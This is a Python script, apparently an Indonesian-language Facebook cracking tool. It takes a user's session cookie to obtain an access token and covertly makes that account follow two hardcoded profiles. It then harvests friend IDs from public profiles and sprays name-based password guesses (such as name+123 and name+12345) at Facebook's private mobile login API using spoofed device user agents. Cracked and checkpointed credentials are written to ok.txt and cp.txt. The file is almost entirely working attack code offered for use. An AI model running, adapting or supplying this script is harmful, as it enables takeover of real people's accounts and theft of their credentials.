# IMPORT MODULE SCRIPT
import os, sys, re, time, requests, calendar, random, bs4, uuid, json, subprocess
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parse
from datetime import datetime

# MODULE RICH SCRIPT
from rich.panel import Panel
from rich.tree import Tree
from rich import print as cetak
from rich.console import Console
from rich.columns import Columns

# INDICATION SCRIPT
uid1,uid2 = [],[]
loop,ugen = 0,[]
ok,cp = [],[]
data,data2 = {},{}
ses = requests.Session()
mysosmed = ["100030564977732","100046047314497"]

for x in range(10000):
      android = str(random.randint(4,9))+"."+str(random.randint(0,1))+"."+str(random.randint(0,1))
      fbav = str(random.randint(37,325))+".0.0."+str(random.randint(1,20))+"."+str(random.randint(40,150))
      fbbv = str(random.randint(11111111,99999999));fbrv = str(random.randint(11111111,99999999))
      fbcr = str(random.choice(["TELKOMSEL","AXIS","Indosat","XL","3SinyalKuatHemat","Tsel-PakaiMasker","XL Axiata"]))
      fblc = str(random.choice(["sv_SE","en_GB","en_US","es_MX","th_TH","pl_PL","id_ID"]))
      fbpn = str(random.choice(["com.facebook.katana","com.facebook.adsmanager","com.facebook.lite","com.facebook.orca","com.facebook.mlite","MessengerLite"]))
      large = str(random.choice(["1.0","1.5","2.0","2.5","3.0","3.5"]))+"<=>"+str(random.choice(["650","760","750","1092","1082","650","1080"]))+"<=>"+str(random.choice(["650","760","750","1092","1082","650","1080"]));denincity,width,heigt = large.split("<=>")
      dinda = "Dalvik/2.1.0 (Linux; U; Android "+str(android)+"; vivo X9Plus Build/N2G47H) [FBAN/Orca-Android;FBAV/"+str(fbav)+";FBPN/"+str(fbpn)+";FBLC/"+str(fblc)+";FBBV/"+str(fbbv)+";FBCR/"+str(fbcr)+";FBMF/vivo;FBBD/vivo;FBDV/vivo X9Plus;FBSV/"+str(android)+";FBCA/armeabi-v7a:armeabi;FBDM/"+"{density="+str(denincity)+",width="+str(width)+",height="+str(heigt)+"};FB_FW/1;FBRV/"+str(fbrv)+"]"      
      ara = "Dalvik/2.1.0 (Linux; U; Android "+str(android)+"; Redmi Note 4 Build/NJH47B) [FBAN/Orca-Android;FBAV/"+str(fbav)+";FBPN/"+str(fbpn)+";FBLC/"+str(fblc)+";FBBV/"+str(fbbv)+";FBCR/"+str(fbcr)+";FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 4;FBSV/"+str(android)+";FBCA/armeabi-v7a:armeabi;FBDM/"+"{density="+str(denincity)+",width="+str(width)+",height="+str(heigt)+"};FB_FW/1;FBRV/"+str(fbrv)+"]"
      agista = "Dalvik/2.1.0 (Linux; U; Android "+str(android)+"; CPH1717 Build/N4F26M) [FBAN/Orca-Android;FBAV/"+str(fbav)+";FBPN/"+str(fbpn)+";FBLC/"+str(fblc)+";FBBV/"+str(fbbv)+";FBCR/"+str(fbcr)+";FBMF/OPPO;FBBD/OPPO;FBDV/CPH1717;FBSV/"+str(android)+";FBCA/armeabi-v7a:armeabi;FBDM/"+"{density="+str(denincity)+",width="+str(width)+",height="+str(heigt)+"};FB_FW/1;FBRV/"+str(fbrv)+"]"
      anggun = "Dalvik/2.1.0 (Linux; U; Android "+str(android)+"; SM-C5000 Build/R16NW) [FBAN/Orca-Android;FBAV/"+str(fbav)+";FBPN/"+str(fbpn)+";FBLC/"+str(fblc)+";FBBV/"+str(fbbv)+";FBCR/"+str(fbcr)+";FBMF/vivo;FBBD/vivo;FBDV/SM-C5000;FBSV/"+str(android)+";FBCA/armeabi-v7a:armeabi;FBDM/"+"{density="+str(denincity)+",width="+str(width)+",height="+str(heigt)+"};FB_FW/1;FBRV/"+str(fbrv)+"]"
      freya = "Dalvik/2.1.0 (Linux; U; Android "+str(android)+"; Realme XT Build/QD4A.200905.003) [FBAN/Orca-Android;FBAV/"+str(fbav)+";FBPN/"+str(fbpn)+";FBLC/"+str(fblc)+";FBBV/"+str(fbbv)+";FBCR/"+str(fbcr)+";FBMF/realme;FBBD/realme;FBDV/Realme XT;FBSV/"+str(android)+";FBCA/armeabi-v7a:armeabi;FBDM/"+"{density="+str(denincity)+",width="+str(width)+",height="+str(heigt)+"};FB_FW/1;FBRV/"+str(fbrv)+"]"
      marsha = "Dalvik/2.1.0 (Linux; U; Android "+str(android)+"; Infinix X624B Build/O11019) [FBAN/Orca-Android;FBAV/"+str(fbav)+";FBPN/"+str(fbpn)+";FBLC/"+str(fblc)+";FBBV/"+str(fbbv)+";FBCR/"+str(fbcr)+";FBMF/infinix;FBBD/infinix;FBDV/Infinix X624B;FBSV/"+str(android)+";FBCA/armeabi-v7a:armeabi;FBDM/"+"{density="+str(denincity)+",width="+str(width)+",height="+str(heigt)+"};FB_FW/1;FBRV/"+str(fbrv)+"]"
      ugen.append(str(random.choice([dinda,agista,anggun,freya,marsha,ara])))

# LOGIN COKIES SCRIPT
class login:
  
  # GET TOKEN EAAJ
  def logincokies(self):
    global data,data2
    os.system("clear")
    cok = Console().input('[bold white][[bold green]•[bold white]] Masukan Cokies : ')
    try:
      link = ses.post('https://graph.facebook.com/v16.0/device/login/', data={'access_token': '661587963994814|ffe07cc864fd1dc8fe386229dcb7a05e', 'scope': ''}).json()
      kode,user = link['code'],link['user_code']
      vers = parse(ses.get(f'https://mbasic.facebook.com/device', cookies={'cookie': cok}).content, 'html.parser')
      item = ['fb_dtsg','jazoest','qr']
      for x in vers.find_all('input'):
        if x.get('name') in item:
          aset = {x.get('name'):x.get('value')}
          data.update(aset)
      data.update({'user_code':user})
      meta = parse(ses.post('https://mbasic.facebook.com'+vers.find('form', method='post').get('action'), data=data, cookies={'cookie': cok}).text, 'html.parser')
      xzxz  = meta.find('form',{'method':'post'})
      for x in xzxz('input',{'value':True}):
        try:
          if x['name'] == '__CANCEL__' : pass
          else:data2.update({x['name']:x['value']})
        except Exception as e:pass
      ses.post(f'https://mbasic.facebook.com{xzxz["action"]}', data=data2, cookies={'cookie':cok})
      token = ses.get(f'https://graph.facebook.com/v16.0/device/login_status?method=post&code={kode}&access_token=661587963994814|ffe07cc864fd1dc8fe386229dcb7a05e').json()['access_token']
      open('/sdcard/data/token.txt','w').write(token);open('/sdcard/data/cookies.txt','w').write(cok)
      self.followme(cok)
      cetak("\n[bold white][[bold green]√[bold white]] Login Berhasil Jalankan Ulang Perintah ")
      exit()
    except(KeyError):
      cetak("\n[bold white][[bold red]x[bold white]] Login Gagal Tumbal Mokad")
  
  # BOT KU JANGAN DI GANTI BOLEH DI TAMBAH
  def followme(self,kueh):
    for user in mysosmed:
      try:
        for response in parse(requests.get(f'https://mbasic.facebook.com/'+user,cookies={'cookie':kueh}).text,'html.parser').find_all('a',href=True):
          if '/a/subscribe.php?' in response.get('href'):x=requests.get('https://mbasic.facebook.com{}'.format(response['href']), cookies = {'cookie':kueh}).text
      except:
        pass

# CLASS PEMANGGIL MENU
class misile: 
  
  # INDICATION INIT AND CLEAR
  def __init__(self):
    self.sontol = []
    try:
      if sys.platform.lower == "linux":
        try:
          os.system("clear")
        except:pass
      else:
        os.system("clear")
    except(Exception)as e:print(e)
    self.cektumbal()
  
  # CEK TUMBAL SCRIPT
  def cektumbal(self):
    try:
      response = requests.get('https://graph.facebook.com/me/?&access_token='+open('/sdcard/data/token.txt','r').read()).json()
    except(FileNotFoundError):
      cetak("[bold white][[bold red]x[bold white]] Tumbal Mati Om")
      try:
        os.system("rm -rf /sdcard/data/token.txt &&  -rf /sdcard/data/cookies.txt")
      except(FileNotFoundError):
        login().logincokies()
    except(IOError):
      pass
    try: 
      self.menu(response["name"],response["id"])
    except(KeyError):
      login().logincokies()
  
  # LOGO SCRIPT YAH GES
  def logo(self): 
    cetak(Panel("""
      [bold red] _____   _______  _______  _______  _______ 
      |     \ |    ___||   _   ||_     _||   |   |
      |  --  ||    ___||       |  |   |  |       |
      |_____/ |_______||___|___|  |___|  |___|___|
""",style="bold green",width=61,title="[bold white]Welcome,user"))
  
  # MENU SCRIPT
  def menu(self,name,uid): 
    self.logo()
    self.sontol.append(Panel("""[bold white][[bold green]•[bold white]] Name: """+name+"""
[bold white][[bold green]•[bold white]] Uid : """+uid,style="bold green",width=30,title="[bold white]cookie info"))
    self.sontol.append(Panel("""[bold white][[bold green]•[bold white]] Ip  : """+requests.get('http://ip-api.com/json/').json()["query"]+"""
[bold white][[bold green]•[bold white]] City: """+requests.get('http://ip-api.com/json/').json()['country'],style="bold green",width=30,title="[bold white]user info"))
    cetak(Columns(self.sontol))
    Console(width=61).print(Panel("""[bold white]Ketik [bold green]'mulai' [bold white]untuk mulai Ketik [bold red]'keluar' [bold white]untuk log out""",style="bold green",width=61),justify="center")
    user = Console().input("[bold white][[bold green]•[bold white]] Pilih Menu: ")
    if user == "mulai" or user == "Mulai":
      Console(width=61).print(Panel("[bold white]Masukan Uid Yg Bersifat Publik",style="bold green",width=61),justify="center")
      response = Console().input("[bold white][[bold green]•[bold white]] Masukan Uid: ")
      if response == "" or response == " ":
        cetak("[bold white][[bold red]x[bold white]] Jangan Kososng")
      else:
        for uid in response.split(","):
          dump().publik(uid)
        dump().atur()
    elif user == "keluar" or user == "Keluar":
      os.system("clear")
      cetak("[bold white][[bold green]√[bold white]] Terimakasih Telah Menggunakan Script")
      try:
        os.system("rm -rf /sdcard/data/token.txt &&  -rf /sdcard/data/cookies.txt")
      except(FileNotFoundError):
        pass
    else:
      cetak("[bold white][[bold red]x[bold white]] Menu Tidak Ada Dalam Script")

# DUMP UID DARI GRAPH
class dump:
  
  def atur(self):
    print("\r")
    Console(width=61).print(Panel("""[bold cyan]'n' [bold white]untuk new [bold red]'o' [bold white]untuk old [bold yellow]'r' [bold white]untuk random""",style="bold green",width=61),justify="center")
    user = Console().input("[bold white][[bold green]•[bold white]] Pilih Menu: ")
    if user == "n" or user == "N":
      drink = []
      for kall in sorted(uid1):
        drink.append(kall)
      response1 = len(drink)
      response2 = (response1-1)
      for fasya in range(response1):
        uid2.append(drink[response2])
        response2-=1
      pwlist().worldlist()
    elif user == "o" or user == "O":
      for kalldev in sorted(uid1):
        uid2.append(kalldev)
      pwlist().worldlist()
    elif user == "r" or user == "R":
      for kallxd in uid1:
        kalll = random.randint(0,len(uid1))
        uid2.insert(kalll,kallxd)
      pwlist().worldlist()
      
  def publik(self,user):
    try:
      params = {
        "fields": "friends.fields(id,name).limit(5000)",
        "access_token":open('/sdcard/data/token.txt','r').read()
      }
      for idx in requests.get(
        "https://graph.facebook.com/"+user+"/",params=params
      ).json()['friends']['data']:
        if idx["id"]+'|'+idx["name"] in uid1:pass
        else:
          uid1.append(idx["id"]+'|'+idx["name"])
        animasi = ["[>]","[<]","[•]","[!]","[>]","[<]","[•]","[!]","[+]","[x]"]
        for x in animasi:
          print("\r"+x+" sedang mengumpulkan "+str(len(uid1))+" uid",end=" ")
          time.sleep(0.0002)
    except(KeyError):
      cetak("[bold white][[bold red]x[bold white]] Cokies Mokad atau uid tidak publik")

# PEMBUAT PASWWORD OTOMTIS
class pwlist:
  
  def simpan(self):
    Console(width=61).print(Panel("""[bold white]Hasil [bold green]Ok [bold white]Tersimpan Di [bold green]Ok.txt
[bold white]Hasil [bold yellow]Cp [bold white]Tersimpan Di [bold yellow]Cp.txt""",width=61,style="bold green"),justify="center")
 
  def worldlist(self):
    if len(uid1)==0:
      cetak("[bold white][[bold red]x[bold white]] Uid Tidak Publkk")
    else:
      self.simpan()
      with ThreadPoolExecutor(max_workers=30) as execute:
        for ids in uid2:
          user,nama = ids.split("|")[0],ids.split("|")[1].lower()
          depan = nama.split(" ")[0]
          pwa = []
          if len(nama)<=5: 
            if len(depan)<3:
              pass
            else: 
              pwa.append(depan+'321')
              pwa.append(depan+'123')
              pwa.append(depan+'12345')
              pwa.append(depan+'123456')
              pwa.append(depan+'01')
              pwa.append(depan+'02')
              pwa.append(depan+'03')
                          
          else:
            if len(depan)<3:
              pwa.append(nama)
            else:
              pwa.append(nama)
              pwa.append(depan+'321')
              pwa.append(depan+'123')
              pwa.append(depan+'12345')
              pwa.append(depan+'123456')
              pwa.append(depan+'01')
              pwa.append(depan+'02')
              pwa.append(depan+'03')
            try:
              mburi = nama.split(" ")[1]
            except(IndexError):
              mburi = nama.split(" ")[0]
            if len(mburi)<3:
              pwa.append(depan+mburi)
            else:
              pwa.append(depan+mburi)
              pwa.append(mburi+'123')
              pwa.append(mburi+'321')
              pwa.append(mburi+'12345')
              pwa.append(mburi+'123456')
              pwa.append(mburi+'01')
              pwa.append(mburi+'02')
              pwa.append(mburi+'03')
          execute.submit(self.apih,user,pwa)
          
  def apih(self,user,pasw):
    global loop,ok,cp
    print("\r\x1b[1;92mcracking \x1b[1;97m"+str(loop)+"|"+str(len(uid2))+"\x1b[1;92m OK:-"+str(len(ok))+" \x1b[1;93mCP:-"+str(len(cp))+" \x1b[1;97mstatus:\x1b[1;92mTrue\x1b[0m",end="")
    for pw in pasw:
      try:
        ua = str(random.choice(ugen))
        params = {'User-Agent':ua,'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':user,'password':pw,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_GB','client_country_code':'ID','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
        response = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=params,allow_redirects=False).json()
        if 'session_key' in response:
          session = response['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+'; dpr=2; locale=en_US; wd=950x1835; ';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice;tokenku = response['access_token']
          print("\r*-->"+str(user)+"|"+str(pw)+"|"+str(cookie))
          try:
                link = requests.Session().get("https://mbasic.facebook.com/"+user+"/friends", cookies={"cookie":open("/sdcard/data/cookies.txt","r").read()}).text
                cari = re.findall('<h3 class\=\".*?">(.*?)</h3>', link)
          except(KeyError):
                pass
          if len(cari)==0:
                print("\r*--> Teman: 0")
          else:
                print("\r*--> "+cari[0])
          ok.append(user)
          with open('ok.txt','a') as x:
            x.write(user+'|'+pw+'\n')
          break
        elif 'www.facebook.com' in response['error']['message']:
          print("\r*--> "+str(user)+"|"+str(pw)+"|"+str(ua))
          try:
                link = requests.Session().get("https://mbasic.facebook.com/"+user+"/friends", cookies={"cookie":open("/sdcard/data/cookies.txt","r").read()}).text
                cari = re.findall('<h3 class\=\".*?">(.*?)</h3>', link)
          except(KeyError):
                pass
          if len(cari)==0:
                print("\r*--> Teman: 0")
          else:
                print("\r[coba cek mbasic]"+cari[0])
          cp.append(user)
          with open('cp.txt','a') as x:
            x.write(user+'|'+pw+'\n')
          break
        else:continue
      #except(requests.exceptions.ConnectionError):print("\r\x1b[1;92mcracking \x1b[1;97m"+str(loop)+"|"+str(len(uid2))+"\x1b[1;92m OK:-"+str(len(ok))+" \x1b[1;93mCP:-"+str(len(cp))+" \x1b[1;97mstatus:\x1b[1;91mFalse\x1b[0m",end="");time.sleep(31)
      except(Exception) as e:print(e)
    loop+=1
            
if __name__=="__main__":
  try:os.mkdir("data")
  except:pass
  misile()